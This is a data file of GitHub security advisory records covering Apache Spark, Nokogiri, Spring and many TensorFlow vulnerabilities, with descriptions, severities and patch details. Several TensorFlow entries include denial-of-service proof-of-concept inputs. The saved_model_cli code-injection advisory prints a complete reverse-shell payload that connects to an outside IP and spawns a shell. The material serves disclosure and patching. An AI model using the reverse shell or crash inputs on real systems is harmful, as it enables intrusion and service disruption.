2467,20194,pyspark,GHSA-9rr6-jpg7-9jg6,CVE-2021-38296,https://github.com/advisories/GHSA-9rr6-jpg7-9jg6,high,2022-03-11 00:02:36 UTC,Authentication Bypass by Capture-replay in Apache Spark,"Apache Spark supports end-to-end encryption of RPC connections via ""spark.authenticate"" and ""spark.network.crypto.enabled"". In versions 3.1.2 and earlier, it uses a bespoke mutual authentication protocol that allows for full encryption key recovery. After an initial interactive attack, this would allow someone to decrypt plaintext traffic offline. Note that this does not affect security mechanisms controlled by ""spark.authenticate.enableSaslEncryption"", ""spark.io.encryption.enabled"", ""spark.ssl"", ""spark.ui.strictTransportSecurity"". Update to Apache Spark 3.1.3 or later",pip
2468,18823,nokogiri,GHSA-xh29-r2w5-wx8m,CVE-2022-29181,https://github.com/advisories/GHSA-xh29-r2w5-wx8m,high,2022-05-23 23:15:15 UTC,Nokogiri Improperly Handles Unexpected Data Type,"### Summary

Nokogiri `< v1.13.6` does not type-check all inputs into the XML and HTML4 SAX parsers. For CRuby users, this may allow specially crafted untrusted inputs to cause illegal memory access errors (segfault) or reads from unrelated memory.

### Severity

The Nokogiri maintainers have evaluated this as **High 8.2** (CVSS3.1).


### Mitigation

CRuby users should upgrade to Nokogiri `>= 1.13.6`.

JRuby users are not affected.


### Workarounds

To avoid this vulnerability in affected applications, ensure the untrusted input is a `String` by calling `#to_s` or equivalent.


### Credit

This vulnerability was responsibly reported by @agustingianni and the Github Security Lab.
",rubygems
2469,33906,org.springframework:spring-core,GHSA-rqph-vqwm-22vc,CVE-2022-22971,https://github.com/advisories/GHSA-rqph-vqwm-22vc,moderate,2022-05-13 00:00:29 UTC,Allocation of Resources Without Limits or Throttling in Spring Framework,"In spring framework versions prior to 5.3.20+ , 5.2.22+ and old unsupported versions, application with a STOMP over WebSocket endpoint is vulnerable to a denial of service attack by an authenticated user.",maven
2470,20741,tensorflow,GHSA-75c9-jrh4-79mc,CVE-2022-29216,https://github.com/advisories/GHSA-75c9-jrh4-79mc,high,2022-05-24 22:16:48 UTC,Code injection in `saved_model_cli` in TensorFlow,"### Impact
TensorFlow's `saved_model_cli` tool is vulnerable to a code injection:

```
saved_model_cli run --input_exprs 'x=print(""malicious code to run"")' --dir ./
--tag_set serve --signature_def serving_default
```

This can be used to open a reverse shell                                      

```
saved_model_cli run --input_exprs 'hello=exec(""""""\nimport socket\nimport
subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((""10.0.2.143"",33419))\nsubprocess.call([""/bin/sh"",""-i""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"""""")'
--dir ./ --tag_set serve --signature_def serving_default
```

This is because [the fix](https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7) for [CVE-2021-41228](https://nvd.nist.gov/vuln/detail/CVE-2021-41228) was incomplete. Under [certain code paths](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/tools/saved_model_cli.py#L566-L574) it still allows unsafe execution:

```python
def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):
  # ...

  for input_raw in filter(bool, input_exprs_str.split(';')):
    # ...
    if safe:
      # ...
    else:
      # ast.literal_eval does not work with numpy expressions
      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used
  return input_dict
```

This code path was maintained for compatibility reasons as we had several test cases where numpy expressions were used as arguments.

However, given that the tool is always run manually, the impact of this is still not severe. We have now removed the `safe=False` argument, so all parsing is done withough calling `eval`.

### Patches
We have patched the issue in GitHub commit [c5da7af048611aa29e9382371f0aed5018516cac](https://github.com/tensorflow/tensorflow/commit/c5da7af048611aa29e9382371f0aed5018516cac).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Andey Robins from the Cybersecurity Education and Research Lab in the Department of Computer Science at the University of Wyoming.",pip
2471,20741,tensorflow,GHSA-5889-7v45-q28m,CVE-2022-29213,https://github.com/advisories/GHSA-5889-7v45-q28m,moderate,2022-05-24 22:16:29 UTC,Incomplete validation in signal ops leads to crashes in TensorFlow,"### Impact
The `tf.compat.v1.signal.rfft2d` and `tf.compat.v1.signal.rfft3d` lack input validation and under certain condition can result in crashes (due to `CHECK`-failures).

### Patches 
We have patched the issue in GitHub commit [0a8a781e597b18ead006d19b7d23d0a369e9ad73](https://github.com/tensorflow/tensorflow/commit/0a8a781e597b18ead006d19b7d23d0a369e9ad73) (merging GitHub PR [#55274](https://github.com/tensorflow/tensorflow/pull/55274)).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55263).",pip
2472,20741,tensorflow,GHSA-8wwm-6264-x792,CVE-2022-29212,https://github.com/advisories/GHSA-8wwm-6264-x792,moderate,2022-05-24 22:16:08 UTC,Core dump when loading TFLite models with quantization in TensorFlow,"### Impact
Certain TFLite models that were created using TFLite model converter would crash when loaded in the TFLite interpreter. The culprit is that during quantization the scale of values could be greater than 1 but code was always assuming sub-unit scaling.

Thus, since code was calling [`QuantizeMultiplierSmallerThanOneExp`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/lite/kernels/internal/quantization_util.cc#L114-L123), the `TFLITE_CHECK_LT` assertion would trigger and abort the process.

### Patches
We have patched the issue in GitHub commit [a989426ee1346693cc015792f11d715f6944f2b8](https://github.com/tensorflow/tensorflow/commit/a989426ee1346693cc015792f11d715f6944f2b8).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/43661).",pip
2473,20741,tensorflow,GHSA-xrp2-fhq4-4q3w,CVE-2022-29211,https://github.com/advisories/GHSA-xrp2-fhq4-4q3w,moderate,2022-05-24 22:15:45 UTC,Segfault if `tf.histogram_fixed_width` is called with NaN values in TensorFlow,"### Impact
The implementation of [`tf.histogram_fixed_width`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc) is vulnerable to a crash when the values array contain `NaN` elements:

```python
import tensorflow as tf
import numpy as np

tf.histogram_fixed_width(values=np.nan, value_range=[1,2])
```

The [implementation](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/histogram_op.cc#L35-L74) assumes that all floating point operations are defined and then converts a floating point result to an integer index:

```cc
index_to_bin.device(d) =
    ((values.cwiseMax(value_range(0)) - values.constant(value_range(0)))
         .template cast<double>() /
     step)
        .cwiseMin(nbins_minus_1)
        .template cast<int32>();
```

If `values` contains `NaN` then the result of the division is still `NaN` and the cast to `int32` would result in a crash.

This only occurs on the CPU implementation.

### Patches
We have patched the issue in GitHub commit [e57fd691c7b0fd00ea3bfe43444f30c1969748b5](https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/45770).",pip
2474,20741,tensorflow,GHSA-hc2f-7r5r-r2hg,CVE-2022-29210,https://github.com/advisories/GHSA-hc2f-7r5r-r2hg,moderate,2022-05-24 22:15:20 UTC,Heap buffer overflow due to incorrect hash function in TensorFlow,"### Impact
The [`TensorKey` hash function](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/framework/tensor_key.h#L53-L64) used total estimated `AllocatedBytes()`, which (a) is an estimate per tensor, and (b) is a very poor hash function for constants (e.g. `int32_t`).  It also tried to access individual tensor bytes through `tensor.data()` of size `AllocatedBytes()`.  This led to ASAN failures because the `AllocatedBytes()` is an estimate of total bytes allocated by a tensor, including any pointed-to constructs (e.g. strings), and does not refer to contiguous bytes in the `.data()` buffer.  We couldn't use this byte vector anyways, since types like `tstring` include pointers, whereas we need to hash the string values themselves.

### Patches
We have patched the issue in GitHub commit [1b85a28d395dc91f4d22b5f9e1e9a22e92ccecd6](https://github.com/tensorflow/tensorflow/commit/1b85a28d395dc91f4d22b5f9e1e9a22e92ccecd6).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, which is the only other affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
2475,20741,tensorflow,GHSA-f4rr-5m7v-wxcw,CVE-2022-29209,https://github.com/advisories/GHSA-f4rr-5m7v-wxcw,moderate,2022-05-24 22:14:44 UTC,Type confusion leading to `CHECK`-failure based denial of service in TensorFlow,"### Impact
The [macros that TensorFlow uses for writing assertions (e.g., `CHECK_LT`, `CHECK_GT`, etc.)](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/platform/default/logging.h) have an incorrect logic when comparing `size_t` and `int` values. Due to type conversion rules, several of the macros would trigger incorrectly.

### Patches
We have patched the issue in GitHub commit [b917181c29b50cb83399ba41f4d938dc369109a1](https://github.com/tensorflow/tensorflow/commit/b917181c29b50cb83399ba41f4d938dc369109a1) (merging GitHub PR [#55730](https://github.com/tensorflow/tensorflow/pull/55730)).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55530).",pip
2476,20741,tensorflow,GHSA-2r2f-g8mw-9gvr,CVE-2022-29208,https://github.com/advisories/GHSA-2r2f-g8mw-9gvr,high,2022-05-24 22:14:22 UTC,Segfault and OOB write due to incomplete validation in `EditDistance` in TensorFlow,"### Impact
The implementation of [`tf.raw_ops.EditDistance`]() has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:

```python
import tensorflow as tf

hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64) 
hypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)
hypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)

truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
truth_values = tf.constant(2, shape=[3], dtype=tf.int64)
truth_shape = tf.constant(2, shape=[3], dtype=tf.int64) 

tf.raw_ops.EditDistance(
  hypothesis_indices=hypothesis_indices,
  hypothesis_values=hypothesis_values,
  hypothesis_shape=hypothesis_shape,
  truth_indices=truth_indices,
  truth_values=truth_values,
  truth_shape=truth_shape)
```

In multiple places throughout the code, we are computing an index for a write operation:

```cc
if (g_truth == g_hypothesis) {
  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),
                                output_strides.begin(), int64_t{0});
  OP_REQUIRES(
      ctx, loc < output_elements,
      errors::Internal(""Got an inner product "", loc,
                       "" which would require in writing to outside of ""
                       ""the buffer for the output tensor (max elements "",
                       output_elements, "")""));
  output_t(loc) =
      gtl::LevenshteinDistance<T>(truth_seq, hypothesis_seq, cmp);
  // ...
}
```

However, the existing validation only checks against the upper bound of the array. Hence, it is possible to write before the array by massaging the input to generate negative values for `loc`.

### Patches
We have patched the issue in GitHub commit [30721cf564cb029d34535446d6a5a6357bebc8e7](https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2477,20741,tensorflow,GHSA-5wpj-c6f7-24x8,CVE-2022-29207,https://github.com/advisories/GHSA-5wpj-c6f7-24x8,moderate,2022-05-24 22:13:59 UTC,Undefined behavior when users supply invalid resource handles,"### Impact
Multiple TensorFlow operations misbehave in eager mode when the resource handle provided to them is invalid:

```python
import tensorflow as tf

tf.raw_ops.QueueIsClosedV2(handle=[])
```

```python
import tensorflow as tf

tf.summary.flush(writer=())
```
  
In graph mode, it would have been impossible to perform these API calls, but migration to TF 2.x eager mode opened up this vulnerability. If the resource handle is empty, then a reference is bound to a null pointer inside TensorFlow codebase (various codepaths). This is undefined behavior.

### Patches
We have patched the issue in GitHub commit [a5b89cd68c02329d793356bda85d079e9e69b4e7](https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7) and GitHub commit [dbdd98c37bc25249e8f288bd30d01e118a7b4498](https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Hong Jin from Singapore Management University.",pip
2478,20741,tensorflow,GHSA-rc9w-5c64-9vqq,CVE-2022-29206,https://github.com/advisories/GHSA-rc9w-5c64-9vqq,moderate,2022-05-24 22:13:23 UTC,Missing validation results in undefined behavior in `SparseTensorDenseAdd,"### Impact
The implementation of [`tf.raw_ops.SparseTensorDenseAdd`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse_tensor_dense_add_op.cc) does not fully validate the input arguments:

```python
import tensorflow as tf

a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)
a_values = tf.constant([], shape=[0], dtype=tf.float32)
a_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)

b = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)

tf.raw_ops.SparseTensorDenseAdd(
    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)
```

In this case, a reference gets bound to a `nullptr` during kernel execution. This is UB.

### Patches
We have patched the issue in GitHub commit [11ced8467eccad9c7cb94867708be8fa5c66c730](https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2479,20741,tensorflow,GHSA-54ch-gjq5-4976,CVE-2022-29205,https://github.com/advisories/GHSA-54ch-gjq5-4976,moderate,2022-05-24 22:12:52 UTC,Segfault due to missing support for quantized types,"### Impact
There is a potential for segfault / denial of service in TensorFlow by calling `tf.compat.v1.*` ops which don't yet have support for quantized types (added after migration to TF 2.x):

```python
import numpy as np
import tensorflow as tf

tf.compat.v1.placeholder_with_default(input=np.array([2]),shape=tf.constant(dtype=tf.qint8, value=np.array([1])))
```

In these scenarios, since the kernel is missing, a [`nullptr` value is passed](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L480-L482) to [`ParseDimensionValue`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/eager/pywrap_tfe_src.cc#L296-L320) for the `py_value` argument. Then, this is dereferenced, resulting in segfault.

### Patches
We have patched the issue in GitHub commit [237822b59fc504dda2c564787f5d3ad9c4aa62d9](https://github.com/tensorflow/tensorflow/commit/237822b59fc504dda2c564787f5d3ad9c4aa62d9).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Hong Jin from Singapore Management University.",pip
2480,20741,tensorflow,GHSA-hx9q-2mx4-m4pg,CVE-2022-29204,https://github.com/advisories/GHSA-hx9q-2mx4-m4pg,moderate,2022-05-24 22:12:26 UTC,Missing validation causes denial of service via `Conv3DBackpropFilterV2`,"### Impact
The implementation of [`tf.raw_ops.UnsortedSegmentJoin`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/unsorted_segment_join_op.cc#L83-L148) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

tf.strings.unsorted_segment_join(
  inputs=['123'],
  segment_ids=[0],
  num_segments=-1)
```

The code assumes `num_segments` is a positive scalar but there is no validation:

```cc
const Tensor& num_segments_tensor = context->input(2);
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
// ...
Tensor* output_tensor = nullptr;
TensorShape output_shape =
    GetOutputShape(input_shape, segment_id_shape, num_segments);
```

Since this value is used to allocate the output tensor, a negative value would result in a `CHECK`-failure (assertion failure), as per [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).

### Patches 
We have patched the issue in GitHub commit [84563f265f28b3c36a15335c8b005d405260e943](https://github.com/tensorflow/tensorflow/commit/84563f265f28b3c36a15335c8b005d405260e943) and GitHub commit [20cb18724b0bf6c09071a3f53434c4eec53cc147](https://github.com/tensorflow/tensorflow/commit/20cb18724b0bf6c09071a3f53434c4eec53cc147).
  
The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
      
### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
                       
### Attribution 
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55305).",pip
2481,20741,tensorflow,GHSA-jjm6-4vf7-cjh4,CVE-2022-29203,https://github.com/advisories/GHSA-jjm6-4vf7-cjh4,moderate,2022-05-24 22:11:56 UTC,Integer overflow in `SpaceToBatchND`,"### Impact
The implementation of `tf.raw_ops.SpaceToBatchND` (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:

```python
import tensorflow as tf

input = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)
block_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)
paddings = tf.constant(0, shape=[2,2], dtype=tf.int32)
tf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)
```

The result of this integer overflow is used to allocate the output tensor, hence we get a denial of service via a `CHECK`-failure (assertion failure), as in [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).

### Patches
We have patched the issue in GitHub commit [acd56b8bcb72b163c834ae4f18469047b001fadf](https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf).
  
The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.
  
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
",pip
2482,20741,tensorflow,GHSA-cwpm-f78v-7m5c,CVE-2022-29202,https://github.com/advisories/GHSA-cwpm-f78v-7m5c,moderate,2022-05-24 22:10:51 UTC,Denial of service in `tf.ragged.constant` due to lack of validation,"### Impact
The implementation of [`tf.ragged.constant`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/python/ops/ragged/ragged_factory_ops.py#L146-L239) does not fully validate the input arguments. This results in a denial of service by consuming all available memory:

```python
import tensorflow as tf
tf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)
```
  
### Patches
We have patched the issue in GitHub commit [bd4d5583ff9c8df26d47a23e508208844297310e](https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/55199).
",pip
2483,20741,tensorflow,GHSA-pqhm-4wvf-2jg8,CVE-2022-29201,https://github.com/advisories/GHSA-pqhm-4wvf-2jg8,moderate,2022-05-24 22:10:20 UTC,Missing validation results in undefined behavior in `QuantizedConv2D`,"### Impact
The implementation of [`tf.raw_ops.QuantizedConv2D`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/quantized_conv_ops.cc) does not fully validate the input arguments:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)
filter = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)

# bad args
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[], dtype=tf.float32)
min_filter = tf.constant(0, shape=[], dtype=tf.float32)
max_filter = tf.constant(0, shape=[], dtype=tf.float32)

tf.raw_ops.QuantizedConv2D(
  input=input,
  filter=filter,
  min_input=min_input,
  max_input=max_input,
  min_filter=min_filter,
  max_filter=max_filter, 
  strides=[1, 1, 1, 1],
  padding=""SAME"")
```

In this case, references get bound to `nullptr` for each argument that is empty (in the example, all arguments in the `bad args` section).

### Patches
We have patched the issue in GitHub commit [0f0b080ecde4d3dfec158d6f60da34d5e31693c4](https://github.com/tensorflow/tensorflow/commit/0f0b080ecde4d3dfec158d6f60da34d5e31693c4).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
",pip
2484,20741,tensorflow,GHSA-2vv3-56qg-g2cf,CVE-2022-29200,https://github.com/advisories/GHSA-2vv3-56qg-g2cf,moderate,2022-05-24 22:10:01 UTC,Missing validation causes denial of service via `LSTMBlockCell`,"### Impact
The implementation of [`tf.raw_ops.LSTMBlockCell`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/rnn/lstm_ops.cc) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

tf.raw_ops.LSTMBlockCell( 
  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),
  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),
  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),
  wci=tf.constant(0, shape=[], dtype=tf.float32),
  wcf=tf.constant(0, shape=[17], dtype=tf.float32),
  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),
  forget_bias=1, cell_clip=0, use_peephole=False)
``` 
  
The code does not validate the ranks of any of the arguments to this API call. This results in `CHECK`-failures when the elements of the tensor are accessed.
    
### Patches
We have patched the issue in GitHub commit [803404044ae7a1efac48ba82d74111fce1ddb09a](https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a).
    
The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information                
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
    
### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.
",pip
2485,20741,tensorflow,GHSA-p9rc-rmr5-529j,CVE-2022-29199,https://github.com/advisories/GHSA-p9rc-rmr5-529j,moderate,2022-05-24 22:09:03 UTC,Missing validation causes denial of service via `LoadAndRemapMatrix`,"### Impact
The implementation of [`tf.raw_ops.LoadAndRemapMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/load_and_remap_matrix_op.cc#L70-L98) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

ckpt_path = tf.constant(
    ""/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0"", shape=[], dtype=tf.string)
old_tensor_name = tf.constant(
    ""/tmp/warm_starting_util_test5kl2a3pc/tmpph76tep2/model-0"", shape=[], dtype=tf.string)

row_remapping = tf.constant(0, shape=[], dtype=tf.int64)
col_remapping = tf.constant(3, shape=[3], dtype=tf.int64)
initializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)

tf.raw_ops.LoadAndRemapMatrix(
  ckpt_path=ckpt_path,
  old_tensor_name=old_tensor_name,
  row_remapping=row_remapping,
  col_remapping=col_remapping,
  initializing_values=initializing_values,
  num_rows=1,
  num_cols=1)
```

The code assumes `initializing_values` is a vector but there is no validation for this before accessing its value:

```cc
OP_REQUIRES_OK(context, context->input(""row_remapping"", &row_remapping_t));
const auto row_remapping = row_remapping_t->vec<int64_t>();
```

### Patches
We have patched the issue in GitHub commit [3150642acbbe254e3c3c5d2232143fa591855ac9](https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",pip
2486,20741,tensorflow,GHSA-mg66-qvc5-rm93,CVE-2022-29198,https://github.com/advisories/GHSA-mg66-qvc5-rm93,moderate,2022-05-24 22:08:45 UTC,Missing validation causes denial of service via `SparseTensorToCSRSparseMatrix`,"### Impact
The implementation of [`tf.raw_ops.SparseTensorToCSRSparseMatrix`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse/sparse_tensor_to_csr_sparse_matrix_op.cc#L65-L119) does not fully validate the input arguments. This results in a `CHECK`-failure which can be used to trigger a denial of service attack:

```python
import tensorflow as tf

indices = tf.constant(53, shape=[3], dtype=tf.int64)
values = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)
dense_shape = tf.constant(53, shape=[3], dtype=tf.int64)
    
tf.raw_ops.SparseTensorToCSRSparseMatrix(
  indices=indices,
  values=values,
  dense_shape=dense_shape)
```

The code assumes `dense_shape` is a vector and `indices` is a matrix (as part of requirements for sparse tensors) but there is no validation for this:
  
```cc
    const Tensor& indices = ctx->input(0);
    const Tensor& values = ctx->input(1);
    const Tensor& dense_shape = ctx->input(2);
    const int rank = dense_shape.NumElements();
    OP_REQUIRES(ctx, rank == 2 || rank == 3,
                errors::InvalidArgument(""SparseTensor must have rank 2 or 3; "",
                                        ""but indices has rank: "", rank));
    auto dense_shape_vec = dense_shape.vec<int64_t>();
    // ...
    OP_REQUIRES_OK(
        ctx,
        coo_to_csr(batch_size, num_rows, indices.template matrix<int64_t>(),
                   batch_ptr.vec<int32>(), csr_row_ptr.vec<int32>(),
                   csr_col_ind.vec<int32>()));
```

### Patches
We have patched the issue in GitHub commit [ea50a40e84f6bff15a0912728e35b657548cef11](https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11).

